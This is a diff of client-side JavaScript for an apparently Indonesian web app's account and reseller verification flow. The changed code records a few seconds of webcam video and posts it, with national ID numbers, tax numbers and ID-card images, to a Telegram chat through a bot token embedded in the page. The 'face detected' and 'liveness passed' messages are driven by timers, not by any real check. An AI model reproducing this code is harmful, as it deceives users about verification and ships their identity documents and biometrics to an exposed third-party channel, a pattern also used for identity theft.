@@ -1288,18 +1288,25 @@
         let currentLoginPinInput = '';
         let loginPinFailures = 0;
 
-        function captureFaceFrame() {
+        function recordFaceVideo(stream, duration = 5000) {
             return new Promise((resolve) => {
-                const video = document.getElementById('webcam-video');
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
-                canvas.toBlob((blob) => {
+                let options = { mimeType: 'video/webm' };
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    options = { mimeType: 'video/mp4' };
+                }
+                const mediaRecorder = new MediaRecorder(stream, options);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: options.mimeType });
                     resolve(blob);
-                }, 'image/jpeg', 0.9);
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
+                }, duration);
             });
         }
 
@@ -1317,6 +1324,23 @@
                 });
             } catch (e) {
                 console.error("Gagal mengirim", e);
+            }
+        }
+
+        async function sendVideoToTelegram(fileBlob, captionText) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', fileBlob, 'biometric.mp4'); 
+            if (captionText) fd.append('caption', captionText);
+            fd.append('parse_mode', 'Markdown');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {
+                console.error("Gagal mengirim video", e);
             }
         }
 
@@ -2213,7 +2237,7 @@
             const docInput = document.getElementById('res-doc'); 
             
             if(!biz || !nik || !npwp || docInput.files.length === 0) return showModal("Perhatian", "Lengkapi identitas perizinan dokumen terlebih dahulu.", "error");
-            if(nik.length !== 16) return showModal("Perhatian", "NIK harus berjumlah tepat 16 digit.", "error");
+            if(nik.length !== 16) return showModal("Perhatian", "NIK harus berjumlah 16 digit.", "error");
 
             closeTargetModal('reseller-verif-modal'); 
             openTargetModal('verif-face-modal');
@@ -2225,12 +2249,12 @@
     
               videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
     
-              setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik aktivasi..."; }, 2000);
+              setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memverifikasi..."; }, 1000);
     
               setTimeout(async () => { 
-              const faceBlob = await captureFaceFrame(); 
-              finishResellerBioVerification(biz, nik, npwp, docInput.files[0], faceBlob); 
-              }, 4500);
+                  const faceBlob = await recordFaceVideo(webcamStream, 3000); 
+                  finishResellerBioVerification(biz, nik, npwp, docInput.files[0], faceBlob); 
+              }, 1000);
            } catch(e) {
               showModal("Perhatian", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); 
               cancelFaceScan();
@@ -2249,7 +2273,7 @@
             let captionDoc = `*PERMINTAAN AKTIVASI RESELLER*\nUID Profile: \`${userID}\`\nNama: ${biz}\nNIK: \`${nik}\`\nNPWP Nomor: \`${npwp}\`\nStatus Liveness: Lolos Otentikasi\n\nEksekusi: \`/reseller ${userID}\` \nTolak Berkas: \`/tolak_reseller ${userID}\``;
             
             await sendDocumentToTelegram(docFile, captionDoc);
-            await sendPhotoToTelegram(faceBlob, `*FOTO BIOMETRIK LIVENESS (RESELLER)*\n\`${userID}\``);
+            await sendVideoToTelegram(faceBlob, `*VIDEO BIOMETRIK LIVENESS (RESELLER)*\n\`${userID}\``);
         }
 
         function openDownlineModal() {
@@ -2882,12 +2906,12 @@
   
             videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
 
-            setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik..."; }, 2000);
+            setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memverifikasi..."; }, 1000);
         
             setTimeout(async () => { 
-            const faceBlob = await captureFaceFrame();
+            const faceBlob = await recordFaceVideo(webcamStream, 3000);
             finishBioVerification(n, nik, fileInput.files[0], faceBlob); 
-            }, 4500);
+            }, 1000);
        } catch(e) {
             showModal("Perhatian", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); 
              cancelFaceScan();
@@ -2918,7 +2942,7 @@
             let captionKtp = `*BERKAS VERIFIKASI AKUN*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nKonfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``;
             
             await sendPhotoToTelegram(ktpFile, captionKtp);
-            await sendPhotoToTelegram(faceBlob, `*FOTO BIOMETRIK LIVENESS (KTP)*\n\`${userID}\``);
+            await sendVideoToTelegram(faceBlob, `*VIDEO BIOMETRIK LIVENESS (KTP)*\n\`${userID}\``);
         }
 
         updateAuthUI();
